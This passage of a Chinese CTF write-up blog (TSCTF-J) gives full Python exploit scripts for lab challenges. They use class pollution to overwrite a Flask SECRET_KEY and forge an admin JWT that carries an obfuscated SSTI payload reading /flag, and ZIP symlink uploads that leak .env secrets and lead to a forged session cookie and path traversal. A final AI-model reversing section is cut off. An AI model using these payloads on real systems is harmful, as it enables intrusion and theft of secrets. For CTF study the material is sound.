class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">            &quot;username&quot;: &quot;attacker&quot;,</span><br><span class="line">            &quot;password&quot;: &quot;pass&quot;,</span><br><span class="line">            &quot;__class__&quot;: &#123;</span><br><span class="line">              &quot;__init__&quot;: &#123;</span><br><span class="line">                &quot;__globals__&quot;: &#123;</span><br><span class="line">                  &quot;app&quot;: &#123;</span><br><span class="line">                    &quot;config&quot;: &#123;</span><br><span class="line">                      &quot;SECRET_KEY&quot;: &quot;mysecret&quot;</span><br><span class="line">                    &#125;</span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">新密钥签一个 role 为 admin 的 JWT，并把 user 字段写成绕过 WAF 的模板表达式。示例载荷会把 __globals__、__builtins__、open、read、flag 等关键字拆成字符串拼接与 %c 生成，从而读取 /flag</span><br><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaGVsbG8gKCgobGlwc3VtfGF0dHIoJ19fJyB-ICgnJWMnJTEwMykgfiAnbG9iYWxzX18nKSlbJ19fYnVpbCcgfiAndGluc19fJ11bJ28nIH4gJ3BlbiddKCcvJyB-ICdmbGEnIH4gKCclYyclMTAzKSkpfGF0dHIoJ3JlJyB-</span><br><span class="line">  ICdhZCcpKCkpIGhhY2tlciIsInJvbGUiOiJhZG1pbiJ9.scA4Rp1MLiXDPPu-ye8xGkgaBtC-HTJ2iILqY7mKoVQ</span><br></pre></td></tr></table></figure><p>这里 hello … hacker 在过滤后会变成 ，表达式利用 lipsum 的全局字典拿到 open(‘&#x2F;fla’ ~ ‘%c’%103) 并调用 read()。携带该令牌访问受保护接口</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">BASE_URL = <span class="string">&quot;http://127.0.0.1:58379&quot;</span></span><br><span class="line">SECRET = <span class="string">&quot;mysecret&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b64url</span>(<span class="params">data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="keyword">return</span> base64.urlsafe_b64encode(data).rstrip(<span class="string">b&quot;=&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 伪造带有 SSTI 载荷的管理员 JWT</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">craft_token</span>(<span class="params">secret: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    header = &#123;<span class="string">&quot;alg&quot;</span>: <span class="string">&quot;HS256&quot;</span>, <span class="string">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span>&#125;</span><br><span class="line">    <span class="comment"># 利用 hello/hacker 的替换逻辑，将表达式包裹成 &#123;&#123; ... &#125;&#125; 并读取 /flag</span></span><br><span class="line">    ssti_payload = (</span><br><span class="line">        <span class="string">&quot;hello (((lipsum|attr(&#x27;__&#x27; ~ (&#x27;%c&#x27;%103) ~ &#x27;lobals__&#x27;))[&#x27;__buil&#x27; ~ &#x27;tins__&#x27;]&quot;</span></span><br><span class="line">        <span class="string">&quot;[&#x27;o&#x27; ~ &#x27;pen&#x27;](&#x27;/&#x27; ~ &#x27;fla&#x27; ~ (&#x27;%c&#x27;%103)))|attr(&#x27;re&#x27; ~ &#x27;ad&#x27;)()) hacker&quot;</span></span><br><span class="line">    )</span><br><span class="line">    body = &#123;<span class="string">&quot;user&quot;</span>: ssti_payload, <span class="string">&quot;role&quot;</span>: <span class="string">&quot;admin&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    header_b64 = b64url(json.dumps(header, separators=(<span class="string">&quot;,&quot;</span>, <span class="string">&quot;:&quot;</span>)).encode())</span><br><span class="line">    body_b64 = b64url(json.dumps(body, separators=(<span class="string">&quot;,&quot;</span>, <span class="string">&quot;:&quot;</span>)).encode())</span><br><span class="line">    signing_input = header_b64 + <span class="string">b&quot;.&quot;</span> + body_b64</span><br><span class="line">    signature = b64url(hmac.new(secret.encode(), signing_input, hashlib.sha256).digest())</span><br><span class="line">    <span class="keyword">return</span> (signing_input + <span class="string">b&quot;.&quot;</span> + signature).decode()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 滥用 merge 合并漏洞覆盖 Flask SECRET_KEY</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">poison_secret</span>(<span class="params">base_url: <span class="built_in">str</span>, new_secret: <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    payload = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: <span class="string">&quot;attacker&quot;</span>,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: <span class="string">&quot;pass&quot;</span>,</span><br><span class="line">        <span class="string">&quot;__class__&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;__init__&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;__globals__&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;app&quot;</span>: &#123;</span><br><span class="line">                        <span class="string">&quot;config&quot;</span>: &#123;</span><br><span class="line">                            <span class="string">&quot;SECRET_KEY&quot;</span>: new_secret,</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;</span><br><span class="line">    session = requests.Session()</span><br><span class="line">    session.trust_env = <span class="literal">False</span></span><br><span class="line">    resp = session.post(<span class="string">f&quot;<span class="subst">&#123;base_url&#125;</span>/register&quot;</span>, json=payload, proxies=&#123;<span class="string">&quot;http&quot;</span>: <span class="literal">None</span>, <span class="string">&quot;https&quot;</span>: <span class="literal">None</span>&#125;)</span><br><span class="line">    resp.raise_for_status()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">base_url: <span class="built_in">str</span>, secret: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    poison_secret(base_url, secret)</span><br><span class="line">    token = craft_token(secret)</span><br><span class="line">    session = requests.Session()</span><br><span class="line">    session.trust_env = <span class="literal">False</span></span><br><span class="line">    headers = &#123;<span class="string">&quot;Authorization&quot;</span>: <span class="string">f&quot;Bearer <span class="subst">&#123;token&#125;</span>&quot;</span>&#125;</span><br><span class="line">    resp = session.get(<span class="string">f&quot;<span class="subst">&#123;base_url&#125;</span>/protected&quot;</span>, headers=headers, proxies=&#123;<span class="string">&quot;http&quot;</span>: <span class="literal">None</span>, <span class="string">&quot;https&quot;</span>: <span class="literal">None</span>&#125;)</span><br><span class="line">    resp.raise_for_status()</span><br><span class="line">    <span class="keyword">return</span> resp.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>() -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = exploit(BASE_URL, SECRET)</span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line">    <span class="keyword">except</span> requests.RequestException <span class="keyword">as</span> exc:</span><br><span class="line">        <span class="keyword">raise</span> SystemExit(<span class="string">f&quot;failed: <span class="subst">&#123;exc&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013104959726.png" alt="image-20251013104959726"></p><p>TSCTF-J{y0u_c0mp1373d_7h3_py_pr0813m}!</p><h3 id="FileSystem"><a href="#FileSystem" class="headerlink" title="FileSystem"></a>FileSystem</h3><p>上传 ZIP 时使用系统 unzip，不会过滤符号链接，可在个人上传目录写入一个指向 &#x2F; 的软链接（示例命名为 root），随后通过 &#x2F;files&#x2F;root&#x2F;&lt;路径&gt; 访问宿主文件系统。</p><p>先访问 &#x2F;files&#x2F;root&#x2F;app&#x2F;.env 泄露 SESSION_SECRET，再读 &#x2F;files&#x2F;root&#x2F;app&#x2F;server.js 获取 store.set(‘…’) 中的开发者会话 UUID。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用 SESSION_SECRET 对该 UUID 计算 connect.sid（s:&lt;uuid&gt;.&lt;HMAC&gt;），设置此 cookie 并伪造请求头 X-Forwarded-For: 127.0.0.1，即可满足 developmentOnly 中“本地开发者”条件并访问 /debug/files。</span><br></pre></td></tr></table></figure><p>&#x2F;debug&#x2F;files 接受外部传入的 sessionId，缺乏路径限制。传入 ..&#x2F;..&#x2F;..&#x2F;..&#x2F;.. 等遍历值即可列出真正的根目录，发现入口脚本随机生成的 8 位目录名。</p><p>最后再上传一个软链接（如 flag 指向 &#x2F;&lt;随机目录&gt;&#x2F;flag.txt），通过 &#x2F;files&#x2F;flag 成功读取 flag。</p><ol><li>上传带有符号链接的 ZIP，读取 &#x2F;app&#x2F;.env 和 &#x2F;app&#x2F;server.js，获取 SESSION_SECRET 与开发者会话 UUID。</li><li>使用密钥伪造 connect.sid，访问 &#x2F;debug&#x2F;files 并目录穿越枚举根目录，确定随机 flag 目录。</li><li>再次上传指向 flag.txt 的符号链接，通过 &#x2F;files&#x2F;flag 直接获取 flag。</li></ol><p>AI写脚本太强了 0.0</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Dict</span>, <span class="type">List</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">BASE_URL = <span class="string">&quot;http://127.0.0.1:56046&quot;</span></span><br><span class="line">ROOT_HEADERS = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;solve.py&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_zip</span>(<span class="params">symlinks: <span class="type">Dict</span>[<span class="built_in">str</span>, <span class="built_in">str</span>]</span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;构造包含符号链接的 ZIP 二进制数据。&quot;&quot;&quot;</span></span><br><span class="line">    buf = io.BytesIO()</span><br><span class="line">    <span class="keyword">with</span> zipfile.ZipFile(buf, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> zf:</span><br><span class="line">        <span class="keyword">for</span> name, target <span class="keyword">in</span> symlinks.items():</span><br><span class="line">            entry = zipfile.ZipInfo(name)</span><br><span class="line">            entry.create_system = <span class="number">3</span>            <span class="comment"># 指定 *nix 平台，允许符号链接</span></span><br><span class="line">            entry.external_attr = <span class="number">0o120777</span> &lt;&lt; <span class="number">16</span></span><br><span class="line">            zf.writestr(entry, target)</span><br><span class="line">    buf.seek(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> buf.getvalue()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_zip</span>(<span class="params">sess: requests.Session, mapping: <span class="type">Dict</span>[<span class="built_in">str</span>, <span class="built_in">str</span>]</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;上传符号链接 ZIP 到 /upload。&quot;&quot;&quot;</span></span><br><span class="line">    payload = build_zip(mapping)</span><br><span class="line">    files = &#123;<span class="string">&quot;zipfile&quot;</span>: (<span class="string">&quot;exploit.zip&quot;</span>, payload, <span class="string">&quot;application/zip&quot;</span>)&#125;</span><br><span class="line">    resp = sess.post(<span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/upload&quot;</span>, files=files, headers=ROOT_HEADERS, allow_redirects=<span class="literal">False</span>, timeout=<span class="number">10</span>)</span><br><span class="line">    <span class="keyword">if</span> resp.status_code != <span class="number">302</span>:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;上传 ZIP 失败，HTTP <span class="subst">&#123;resp.status_code&#125;</span>：<span class="subst">&#123;resp.text[:<span class="number">200</span>]&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fetch_named_file</span>(<span class="params">sess: requests.Session, name: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;通过 /files/&lt;name&gt; 读取文件内容。&quot;&quot;&quot;</span></span><br><span class="line">    resp = sess.get(<span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/files/<span class="subst">&#123;name&#125;</span>&quot;</span>, headers=ROOT_HEADERS, timeout=<span class="number">10</span>)</span><br><span class="line">    <span class="keyword">if</span> resp.status_code != <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;读取 <span class="subst">&#123;name&#125;</span> 失败，HTTP <span class="subst">&#123;resp.status_code&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> resp.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sign_cookie</span>(<span class="params">value: <span class="built_in">str</span>, secret: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;根据 express-session 规则签名 connect.sid。&quot;&quot;&quot;</span></span><br><span class="line">    mac = hmac.new(secret.encode(), value.encode(), hashlib.sha256).digest()</span><br><span class="line">    sig = base64.b64encode(mac).decode().rstrip(<span class="string">&quot;=&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;s:<span class="subst">&#123;value&#125;</span>.<span class="subst">&#123;sig&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug_list</span>(<span class="params">dev_sess: requests.Session, session_id: <span class="built_in">str</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">str</span>]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;访问 /debug/files 并解析返回的文件名列表。&quot;&quot;&quot;</span></span><br><span class="line">    headers = <span class="built_in">dict</span>(ROOT_HEADERS)</span><br><span class="line">    headers[<span class="string">&quot;X-Forwarded-For&quot;</span>] = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">    params = &#123;<span class="string">&quot;sessionId&quot;</span>: session_id&#125;</span><br><span class="line">    resp = dev_sess.get(<span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/debug/files&quot;</span>, headers=headers, params=params, timeout=<span class="number">10</span>)</span><br><span class="line">    <span class="keyword">if</span> resp.status_code != <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;/debug/files 访问失败，HTTP <span class="subst">&#123;resp.status_code&#125;</span>：<span class="subst">&#123;resp.text[:<span class="number">200</span>]&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> re.findall(<span class="string">r&#x27;&lt;li class=&quot;list-group-item&quot;&gt;\s*([^&lt;\s]+)&#x27;</span>, resp.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>() -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] 步骤 0：初始化普通用户会话&quot;</span>)</span><br><span class="line">    user = requests.Session()</span><br><span class="line">    user.get(BASE_URL + <span class="string">&quot;/&quot;</span>, headers=ROOT_HEADERS, timeout=<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] 步骤 1：上传 env/server 符号链接 ZIP&quot;</span>)</span><br><span class="line">    upload_zip(user, &#123;<span class="string">&quot;env&quot;</span>: <span class="string">&quot;/app/.env&quot;</span>, <span class="string">&quot;server&quot;</span>: <span class="string">&quot;/app/server.js&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    env_content = fetch_named_file(user, <span class="string">&quot;env&quot;</span>)</span><br><span class="line">    match_secret = re.search(<span class="string">r&quot;SESSION_SECRET=(.+)&quot;</span>, env_content)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> match_secret:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;未能在 .env 中找到 SESSION_SECRET&quot;</span>)</span><br><span class="line">    session_secret = match_secret.group(<span class="number">1</span>).strip()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] SESSION_SECRET = <span class="subst">&#123;session_secret&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    server_js = fetch_named_file(user, <span class="string">&quot;server&quot;</span>)</span><br><span class="line">    match_dev = re.search(<span class="string">r&quot;store\.set\(&#x27;([^&#x27;]+)&#x27;\s*,&quot;</span>, server_js)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> match_dev:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;未能在 server.js 中找到开发会话 UUID&quot;</span>)</span><br><span class="line">    dev_session_id = match_dev.group(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] 开发者会话 UUID = <span class="subst">&#123;dev_session_id&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] 步骤 2：伪造 connect.sid 并访问 /debug/files&quot;</span>)</span><br><span class="line">    dev = requests.Session()</span><br><span class="line">    connect_sid = sign_cookie(dev_session_id, session_secret)</span><br><span class="line">    dev.cookies.<span class="built_in">set</span>(<span class="string">&quot;connect.sid&quot;</span>, connect_sid, domain=<span class="string">&quot;127.0.0.1&quot;</span>, path=<span class="string">&quot;/&quot;</span>)</span><br><span class="line"></span><br><span class="line">    root_entries = debug_list(dev, <span class="string">&quot;../../../../..&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] 根目录条目：<span class="subst">&#123;root_entries&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    flag_dir = <span class="built_in">next</span>((name <span class="keyword">for</span> name <span class="keyword">in</span> root_entries <span class="keyword">if</span> re.fullmatch(<span class="string">r&quot;[a-z0-9]&#123;8&#125;&quot;</span>, name)), <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> flag_dir:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;未找到符合格式的 flag 目录名&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Flag 目录 = /<span class="subst">&#123;flag_dir&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] 步骤 3：上传指向 flag.txt 的符号链接并读取&quot;</span>)</span><br><span class="line">    upload_zip(user, &#123;<span class="string">&quot;flag&quot;</span>: <span class="string">f&quot;/<span class="subst">&#123;flag_dir&#125;</span>/flag.txt&quot;</span>&#125;)</span><br><span class="line">    flag_content = fetch_named_file(user, <span class="string">&quot;flag&quot;</span>).strip()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Flag = <span class="subst">&#123;flag_content&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        main()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> exc:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] 运行失败：<span class="subst">&#123;exc&#125;</span>&quot;</span>, file=sys.stderr)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013105656157.png" alt="image-20251013105656157"></p><p>TSCTF-J{@r3-yOu-a_SYMboIIC-LiNK-m4St3R?274e7a}</p><h2 id="AI"><a href="#AI" class="headerlink" title="AI"></a>AI</h2><h3 id="JustReverse"><a href="#JustReverse" class="headerlink" title="JustReverse"></a>JustReverse</h3><p>AI逆向题</p><p>可以看到原流程，把 flag 逐字符转成 8 位二进制 ，组成张量后，依次经过 conv1、conv2、linear、conv3，最后写成 ciphertext.txt。</p><p>因为 conv1 权重是 [1,2;4,8] 且 conv2 只有 0.5 的权重、正偏置，ReLU 永远不会把值裁掉，相当于把每 4 位二进制压成一个 0–15 的整数之后线性放大，对应关系可以反推。</p><p>关键是 model.pth 内已经存了所有权重，用 unzip + 伪造 torch 模块即可用 pickle 读出，再用 numpy 分别逆向：先从 ciphertext.txt 里减去 conv3.bias，按照卷积公式顺序解开 2×2 卷积；得到的 58×58 矩阵 reshape 成向量，减去 linear.bias，利用 np.linalg.lstsq 求解线性方程组拿回 conv2 的输出。</p><p>最后把线性层输出还原到 0–15 之间的数字，再根据 [1,2,4,8] 的系数拆回每 4 位二进制，合并为 flag 字符。整个过程就是顺序逆操作 + 线性求解。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile, pickle, types, sys, io</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">torch = types.ModuleType(<span class="string">&#x27;torch&#x27;</span>)</span><br><span class="line">sys.modules[<span class="string">&#x27;torch&#x27;</span>] = torch</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FloatStorage</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, size=<span class="number">0</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>.size = size</span><br><span class="line"></span><br><span class="line">torch.FloatStorage = FloatStorage</span><br><span class="line">utils = types.ModuleType(<span class="string">&#x27;torch._utils&#x27;</span>)</span><br><span class="line">sys.modules[<span class="string">&#x27;torch._utils&#x27;</span>] = utils</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> 